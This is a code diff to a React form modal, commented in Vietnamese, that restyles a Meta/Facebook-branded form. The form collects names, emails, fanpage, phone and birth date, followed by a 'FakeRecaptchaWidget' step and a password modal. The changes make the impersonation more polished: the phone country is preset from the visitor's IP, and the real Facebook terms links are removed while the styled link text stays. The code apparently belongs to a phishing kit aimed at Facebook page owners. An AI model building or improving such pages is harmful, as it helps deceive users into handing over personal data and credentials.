@@ -1,5 +1,10 @@
 import React from 'react';
 import Modal from '#components/modals/Modal';
+import {
+  modalDetailsClass,
+  modalInfoBoxClass,
+  modalSecondaryBtnClass,
+} from '#components/modals/modalStyles';
 import PhoneInput from 'react-phone-input-2';
 import CustomCheckbox from '#components/check-box/CustomCheckbox';
 import FakeRecaptchaWidget from '#components/recaptcha/FakeRecaptchaWidget';
@@ -13,9 +18,15 @@ interface InfomationsModalProps {
   onToggleModal: (isOpen: boolean) => void;
 }
 
-const META_TERMS_URL = 'https://www.facebook.com/legal/terms/';
-const META_PRIVACY_URL = 'https://www.facebook.com/privacy/policy/';
 const AGREE_CHECKBOX_ID = 'fbcm-agree-terms';
+
+/** ISO 3166-1 alpha-2 (từ IP) → mã country của react-phone-input-2 */
+function toPhoneInputCountry(countryCode?: string): string {
+  const code = (countryCode || '').trim().toLowerCase()
+  if (!/^[a-z]{2}$/.test(code)) return 'us'
+  if (code === 'uk') return 'gb'
+  return code
+}
 
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
   const t = useAppStrings();
@@ -29,9 +40,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   const [phase, setPhase] = React.useState<'form' | 'captcha'>('form');
   const [captchaMountKey, setCaptchaMountKey] = React.useState(0);
   const [agreedToTerms, setAgreedToTerms] = React.useState(false);
+  /** User đã sửa SĐT → không ép lại country khi IP cập nhật */
+  const [phoneTouched, setPhoneTouched] = React.useState(false);
   const captchaRegionRef = React.useRef<HTMLDivElement>(null);
   const dispatch = useAppDispatch();
   const formData = useAppSelector((state) => state.stepForm.data);
+  const phoneCountry = toPhoneInputCountry(formData.country_code);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
     const { id, value } = e.target;
@@ -44,7 +58,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
     if (isOpend) {
       setPhase('form');
       setAgreedToTerms(false);
+      // Chưa có SĐT → cho phép gắn country theo IP; đã có thì giữ nguyên
+      setPhoneTouched(Boolean(normalizePhoneDigits(formData.phone)));
     }
+    // Chỉ khi mở/đóng modal — không theo dõi từng lần gõ SĐT
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isOpend]);
 
   React.useEffect(() => {
@@ -64,30 +82,31 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
     try {
       e.preventDefault();
 
+      // Lưu key lỗi — render bằng t.info[key] để đổi ngôn ngữ vẫn cập nhật
       const newErrors: Record<string, string> = {};
-      if (!formData.fullName.trim()) newErrors.fullName = t.info.errFullName;
+      if (!formData.fullName.trim()) newErrors.fullName = 'errFullName';
       if (!formData.email.trim()) {
-        newErrors.email = t.info.errEmail;
+        newErrors.email = 'errEmail';
       } else if (!emailRegex.test(formData.email.trim())) {
-        newErrors.email = t.info.errEmailFmt;
+        newErrors.email = 'errEmailFmt';
       }
       if (!formData.emailBusiness.trim()) {
-        newErrors.emailBusiness = t.info.errEmailBiz;
+        newErrors.emailBusiness = 'errEmailBiz';
       } else if (!emailRegex.test(formData.emailBusiness.trim())) {
-        newErrors.emailBusiness = t.info.errEmailBizFmt;
+        newErrors.emailBusiness = 'errEmailBizFmt';
       }
-      if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage;
+      if (!formData.fanpage.trim()) newErrors.fanpage = 'errFanpage';
       const phoneDigits = normalizePhoneDigits(formData.phone);
       const phoneDigitCount = getPhoneDigitCount(formData.phone);
       if (!phoneDigits) {
-        newErrors.phone = t.info.errPhone;
-      } else if (phoneDigitCount < 8 || phoneDigitCount > 15) {
-        newErrors.phone = t.info.errPhoneLen;
+        newErrors.phone = 'errPhone';
+      } else if (phoneDigitCount < 8 || phoneDigitCount > 25) {
+        newErrors.phone = 'errPhoneLen';
       }
-      if (!formData.day) newErrors.day = t.info.errDay;
-      if (!formData.month) newErrors.month = t.info.errMonth;
-      if (!formData.year) newErrors.year = t.info.errYear;
-      if (!agreedToTerms) newErrors.agree = t.info.errAgree;
+      if (!formData.day) newErrors.day = 'errDay';
+      if (!formData.month) newErrors.month = 'errMonth';
+      if (!formData.year) newErrors.year = 'errYear';
+      if (!agreedToTerms) newErrors.agree = 'errAgree';
 
       if (Object.keys(newErrors).length > 0) {
         setErrors(newErrors);
@@ -108,8 +127,16 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
     }
   };
 
-  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
-  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+  const infoErrorText = (key?: string) => {
+    if (!key) return null
+    const message = (t.info as Record<string, string>)[key]
+    return message || null
+  }
+
+  const controlClass = (invalid: boolean) =>
+    `h-11 w-full rounded-lg border bg-white px-3 text-[14px] text-[#1c1e21] outline-none transition ${
+      invalid ? 'border-red-500' : 'border-[#ccd0d5] hover:border-[#b0b7c3] focus:border-[#0064e0] focus:ring-2 focus:ring-[#0064e0]/15'
+    }`;
   const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
   const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
   const currentYear = new Date().getFullYear();
@@ -130,13 +157,16 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       isOpen={isOpen}
       title={modalTitle}
       onClose={handleClose}
+      wide
     >
       <div className="flex min-h-full min-w-0 w-full flex-col">
         {phase === 'captcha' ? (
-          <div ref={captchaRegionRef} tabIndex={-1} className="w-full rounded-md outline-none ring-offset-2 focus-visible:ring-2 focus-visible:ring-[#0064e0]">
-            <p className="mb-4 rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px] text-[13px] leading-[1.55] text-[#33507f]">
-              {t.captcha.verifyHint}
-            </p>
+          <div
+            ref={captchaRegionRef}
+            tabIndex={-1}
+            className="w-full rounded-xl outline-none ring-offset-2 focus-visible:ring-2 focus-visible:ring-[#0064e0]"
+          >
+            <p className={modalInfoBoxClass}>{t.captcha.verifyHint}</p>
             <FakeRecaptchaWidget
               key={captchaMountKey}
               idPrefix="fbcm-info-modal"
@@ -148,215 +178,152 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               }}
               onVerified={finalizeAfterCaptcha}
             />
-            <details className="mt-5 rounded-xl border border-[#e8eaed] bg-[#fafbfc] px-[12px] py-2">
-              <summary className="cursor-pointer select-none py-2 text-[13px] font-semibold text-[#3b4a64]">{t.captcha.legalDetailsLabel}</summary>
-              <div className="mt-2 max-h-[160px] space-y-3 overflow-y-auto border-t border-[#eef0f3] pb-3 pt-3 text-[11px] leading-[1.45] text-[#5c6570] sm:text-[12px]">
-                <p className="font-normal">{t.captcha.p1}</p>
-                <p className="font-normal">{t.captcha.p2}</p>
-                <p className="font-normal">{t.captcha.p3}</p>
-              </div>
-            </details>
-            <button
-              type="button"
-              className="mt-5 min-h-[44px] w-full rounded-full border border-[#d8dee6] bg-white text-[14px] font-semibold text-[#3b4a64] transition hover:bg-[#f6f8fa] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]"
-              onClick={handleBackFromCaptcha}
-            >
+            <div className={`${modalDetailsClass} space-y-2 px-3.5 py-2.5 text-[11px] leading-snug text-[#65676B]`}>
+              <p className="font-normal">{t.captcha.p1}</p>
+              <p className="font-normal">{t.captcha.p2}</p>
+              <p className="font-normal">{t.captcha.p3}</p>
+            </div>
+            <button type="button" className={modalSecondaryBtnClass} onClick={handleBackFromCaptcha}>
               {t.captcha.backToForm}
             </button>
           </div>
         ) : (
-        <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
-          <div className='w-full'>
-            <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
-              <p className='text-[13px] leading-[1.55] text-[#33507f]'>
-                {t.info.hint}
-              </p>
-            </div>
-            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
-            <div className={inputClass('fullName')}>
-              <input
-                type="text"
-                id='fullName'
-                placeholder={t.info.fullNamePh}
-                className="w-full outline-0 h-full tracking-wide"
-                value={formData.fullName}
-                onChange={handleChange}
-              />
-            </div>
-            {errorText('fullName')}
+        <form onSubmit={handSubmit} autoComplete="off" className="flex w-full flex-col gap-4">
+          <p className="rounded-lg bg-[#f0f2f5] px-3 py-2.5 text-[13px] leading-relaxed text-[#3d4d66]">
+            {t.info.hint}
+          </p>
 
-            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
-            <div className={inputClass('email')}>
-              <input
-                type="email"
-                id='email'
-                placeholder={t.info.emailPh}
-                className="w-full outline-0 h-full tracking-wide"
-                value={formData.email}
-                onChange={handleChange}
-              />
+          <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+            <div className="min-w-0">
+              <label htmlFor="fullName" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.fullName} <span className="text-[#e5484d]">*</span></label>
+              <input id="fullName" type="text" placeholder={t.info.fullNamePh} className={controlClass(!!errors.fullName)} value={formData.fullName} onChange={handleChange} />
+              {errors.fullName ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.fullName)}</p> : null}
             </div>
-            {errorText('email')}
+            <div className="min-w-0">
+              <label htmlFor="fanpage" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.fanpage} <span className="text-[#e5484d]">*</span></label>
+              <input id="fanpage" type="text" placeholder={t.info.fanpagePh} className={controlClass(!!errors.fanpage)} value={formData.fanpage} onChange={handleChange} />
+              {errors.fanpage ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.fanpage)}</p> : null}
+            </div>
+            <div className="min-w-0">
+              <label htmlFor="email" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.email} <span className="text-[#e5484d]">*</span></label>
+              <input id="email" type="email" placeholder={t.info.emailPh} className={controlClass(!!errors.email)} value={formData.email} onChange={handleChange} />
+              {errors.email ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.email)}</p> : null}
+            </div>
+            <div className="min-w-0">
+              <label htmlFor="emailBusiness" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.emailBiz} <span className="text-[#e5484d]">*</span></label>
+              <input id="emailBusiness" type="email" placeholder={t.info.emailBizPh} className={controlClass(!!errors.emailBusiness)} value={formData.emailBusiness} onChange={handleChange} />
+              {errors.emailBusiness ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.emailBusiness)}</p> : null}
+            </div>
 
-            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.emailBiz} <span className='text-[#e5484d]'>*</span></label>
-            <div className={inputClass('emailBusiness')}>
-              <input
-                type="email"
-                id='emailBusiness'
-                placeholder={t.info.emailBizPh}
-                className="w-full outline-0 h-full tracking-wide"
-                value={formData.emailBusiness}
-                onChange={handleChange}
-              />
+            <div className="min-w-0 sm:col-span-2">
+              <label className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.phone} <span className="text-[#e5484d]">*</span></label>
+              {/* Luôn LTR: số điện thoại / + không bị đảo khi trang RTL (he, ar) */}
+              <div
+                dir="ltr"
+                className={`h-11 rounded-lg border bg-white ${errors.phone ? 'border-red-500' : 'border-[#ccd0d5]'}`}
+              >
+                <PhoneInput
+                  key={phoneTouched ? 'phone-manual' : `phone-${phoneCountry}`}
+                  country={phoneCountry}
+                  value={formData.phone}
+                  preferredCountries={[phoneCountry]}
+                  autoFormat={false}
+                  enableSearch
+                  containerClass="phone-input-ltr"
+                  inputClass="phone-input-ltr__field"
+                  onChange={(phone) => {
+                    setPhoneTouched(true);
+                    const normalizedPhone = normalizePhoneDigits(phone).slice(0, 25);
+                    dispatch(updateForm({ phone: normalizedPhone }));
+                    setErrors(prev => ({ ...prev, phone: '' }));
+                  }}
+                  inputProps={{
+                    name: 'phone',
+                    required: true,
+                    autoComplete: 'tel',
+                    dir: 'ltr',
+                    inputMode: 'tel',
+                  }}
+                />
+              </div>
+              {errors.phone ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.phone)}</p> : null}
             </div>
-            {errorText('emailBusiness')}
 
-            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
-            <div className={inputClass('fanpage')}>
-              <input
-                type="text"
-                id='fanpage'
-                placeholder={t.info.fanpagePh}
-                className="w-full outline-0 h-full tracking-wide"
-                value={formData.fanpage}
-                onChange={handleChange}
-              />
-            </div>
-            {errorText('fanpage')}
-
-            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
-            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
-              <PhoneInput
-                country={formData.country_code?.toLowerCase() || "us"}
-                value={formData.phone}
-                onChange={(phone) => {
-                  const normalizedPhone = normalizePhoneDigits(phone).slice(0, 15);
-                  dispatch(updateForm({ phone: normalizedPhone }))
-                  setErrors(prev => ({ ...prev, phone: '' }))
-                }}
-                inputProps={{
-                  name: 'phone',
-                  required: true,
-                }}
-              />
-            </div>
-            {errorText('phone')}
-
-            <div>
-              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
-            </div>
-            <div className="grid grid-cols-1 gap-[10px] sm:grid-cols-3">
-              <div>
-                <div className={inputClass('day')}>
-                  <select
-                    id='day'
-                    className="w-full outline-0 h-full"
-                    value={formData.day}
-                    onChange={handleChange}
-                  >
+            <div className="min-w-0 sm:col-span-2">
+              <p className="mb-1.5 text-[13px] font-semibold text-[#1c1e21]">{t.info.dob} <span className="text-[#e5484d]">*</span></p>
+              <div className="grid grid-cols-3 gap-2">
+                <div>
+                  <select id="day" aria-label={t.info.day} className={controlClass(!!errors.day)} value={formData.day} onChange={handleChange}>
                     <option value="">{t.info.day}</option>
                     {days.map((day) => (
                       <option key={day} value={day}>{day}</option>
                     ))}
                   </select>
+                  {errors.day ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.day)}</p> : null}
                 </div>
-                {errorText('day')}
-              </div>
-
-              <div>
-                <div className={inputClass('month')}>
-                  <select
-                    id='month'
-                    className="w-full outline-0 h-full"
-                    value={formData.month}
-                    onChange={handleChange}
-                  >
+                <div>
+                  <select id="month" aria-label={t.info.month} className={controlClass(!!errors.month)} value={formData.month} onChange={handleChange}>
                     <option value="">{t.info.month}</option>
                     {months.map((month) => (
                       <option key={month} value={month}>{month}</option>
                     ))}
                   </select>
+                  {errors.month ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.month)}</p> : null}
                 </div>
-                {errorText('month')}
-              </div>
-
-              <div>
-                <div className={inputClass('year')}>
-                  <select
-                    id='year'
-                    className="w-full outline-0 h-full"
-                    value={formData.year}
-                    onChange={handleChange}
-                  >
+                <div>
+                  <select id="year" aria-label={t.info.year} className={controlClass(!!errors.year)} value={formData.year} onChange={handleChange}>
                     <option value="">{t.info.year}</option>
                     {years.map((year) => (
                       <option key={year} value={year}>{year}</option>
                     ))}
                   </select>
+                  {errors.year ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.year)}</p> : null}
                 </div>
-                {errorText('year')}
               </div>
-
             </div>
 
-            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.message}</label>
-            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
+            <div className="min-w-0 sm:col-span-2">
+              <label htmlFor="message" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.message}</label>
               <textarea
-                id='message'
-                className="w-full outline-0 h-full resize-none"
+                id="message"
+                rows={3}
+                className="h-24 w-full resize-none rounded-lg border border-[#ccd0d5] bg-white px-3 py-2.5 text-[14px] text-[#1c1e21] outline-none transition hover:border-[#b0b7c3] focus:border-[#0064e0] focus:ring-2 focus:ring-[#0064e0]/15"
                 placeholder={t.info.messagePh}
                 value={formData.message}
                 onChange={handleChange}
               />
             </div>
-
-            <div className='mt-[15px] mb-[14px]'>
-              <label htmlFor={AGREE_CHECKBOX_ID} className="flex cursor-pointer items-start gap-[10px] text-[14px] leading-snug">
-                <span className="mt-[2px] shrink-0">
-                  <CustomCheckbox
-                    id={AGREE_CHECKBOX_ID}
-                    checked={agreedToTerms}
-                    invalid={!!errors.agree}
-                    aria-describedby={errors.agree ? 'fbcm-agree-error' : undefined}
-                    onCheckedChange={(next) => {
-                      setAgreedToTerms(next);
-                      setErrors((prev) => ({ ...prev, agree: '' }));
-                    }}
-                  />
-                </span>
-                <span className="min-w-0 text-[#1c1e21]">
-                  <span>{t.info.agree}</span>{' '}
-                  <a
-                    href={META_TERMS_URL}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="font-semibold text-[#0064E0] underline-offset-2 hover:underline"
-                    onClick={(e) => e.stopPropagation()}
-                  >
-                    {t.info.agreeTerms}
-                  </a>{' '}
-                  <span>{t.info.agreeAnd}</span>{' '}
-                  <a
-                    href={META_PRIVACY_URL}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="font-semibold text-[#0064E0] underline-offset-2 hover:underline"
-                    onClick={(e) => e.stopPropagation()}
-                  >
-                    {t.main.linkPrivacy}
-                  </a>
-                </span>
-              </label>
-              {errors.agree ? (
-                <p id="fbcm-agree-error" role="alert" className="mt-[10px] text-[13px] text-red-500">{errors.agree}</p>
-              ) : null}
-            </div>
-            <p className='mb-[12px] text-center text-[11px] leading-snug text-[#65676B] sm:text-[12px]'>{t.info.encryptedHint}</p>
-            <div className='w-full mt-[12px] '>
-              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]'>{t.info.submit}</button>
-            </div>
           </div>
 
+          <div className="rounded-lg border border-[#e4e6eb] bg-[#fafbfc] p-3">
+            <label htmlFor={AGREE_CHECKBOX_ID} className="flex cursor-pointer items-start gap-2.5 text-[14px] leading-snug">
+              <span className="mt-0.5 shrink-0">
+                <CustomCheckbox
+                  id={AGREE_CHECKBOX_ID}
+                  checked={agreedToTerms}
+                  invalid={!!errors.agree}
+                  aria-describedby={errors.agree ? 'fbcm-agree-error' : undefined}
+                  onCheckedChange={(next) => {
+                    setAgreedToTerms(next);
+                    setErrors((prev) => ({ ...prev, agree: '' }));
+                  }}
+                />
+              </span>
+              <span className="min-w-0 text-[#1c1e21]">
+                <span>{t.info.agree}</span>{' '}
+                <span className="font-semibold text-[#0064E0]">{t.info.agreeTerms}</span>{' '}
+                <span>{t.info.agreeAnd}</span>{' '}
+                <span className="font-semibold text-[#0064E0]">{t.main.linkPrivacy}</span>
+              </span>
+            </label>
+            {errors.agree ? (
+              <p id="fbcm-agree-error" role="alert" className="mt-2 text-[12px] text-red-600">{infoErrorText(errors.agree)}</p>
+            ) : null}
+          </div>
+
+          <div className="border-t border-[#e4e6eb] pt-3">
+            <button type="submit" className="flex min-h-12 w-full cursor-pointer items-center justify-center rounded-full bg-[#0064E0] text-[15px] font-semibold text-white active:opacity-90 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]">{t.info.submit}</button>
+          </div>
         </form>
         )}
       </div>
